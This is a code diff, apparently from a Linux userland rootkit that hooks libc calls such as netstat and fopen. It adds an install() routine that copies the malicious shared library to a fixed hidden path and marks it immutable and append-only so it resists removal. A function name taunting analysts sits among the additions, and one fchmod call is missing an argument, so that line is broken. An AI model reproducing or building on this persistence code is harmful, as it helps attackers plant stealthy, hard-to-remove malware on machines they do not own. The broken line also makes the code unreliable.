@@ -89,6 +89,53 @@ int fake_netstat(char *pathname, char *newfile){
     return 1;
 }
 
+//Just to show who's the boss.
+void OH_YOU_THINK_YOU_ARE_A_GREAT_HACKER_BY_LOOKING_AT_STRINGS_AND_SHIT_YOU_IDIOT__YOU_HAVE_BEEN_ADOPTED__NOBODY_LOVES_YOU(){}
+
+void install(){
+    struct stat buffer;
+    if (stat(MAGIC_LIBPATH, &buffer) == 0){
+        return;
+    }
+    Dl_info dl_info;
+    dladdr((void*)OH_YOU_THINK_YOU_ARE_A_GREAT_HACKER_BY_LOOKING_AT_STRINGS_AND_SHIT_YOU_IDIOT__YOU_HAVE_BEEN_ADOPTED__NOBODY_LOVES_YOU, &dl_info);
+    char fname[PATH_MAX];
+    realpath((char*)dl_info.dli_fname, fname);
+    if (strcmp(MAGIC_LIBPATH, fname) != 0){
+        #ifdef DEBUG
+        printf("[-] installing lib in %s\n", MAGIC_LIBPATH);
+        #endif
+        if (!hooked_fopen){
+            hooked_fopen = load_libc("fopen");
+        }
+        if (!hooked_ioctl){
+            hooked_ioctl = load_libc("ioctl");
+        }
+        FILE *fr = hooked_fopen(fname,"rb");
+        FILE *fw = hooked_fopen(MAGIC_LIBPATH,"wb");
+        if (!fw){
+            #ifdef DEBUG
+            printf("[-] no write permission\n");
+            #endif
+            return;
+        }
+        char buff[1024];
+        size_t n, m;
+        do{
+            n = fread(buff, 1, sizeof(buff), fr);
+            if (n) m = fwrite(buff, 1, n, fw);
+            else m = 0;
+        } while ((n > 0) && (n == m));
+        fclose(fr);
+        fflush(fw);
+        unsigned long flags = FS_IMMUTABLE_FL | FS_APPEND_FL;
+        int fd = fileno(fw);
+        fchmod(fd, );
+        hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
+        fclose(fw);
+    }
+}
+
 void uninstall(){
     unlink(MAGIC_LIBPATH);
 }
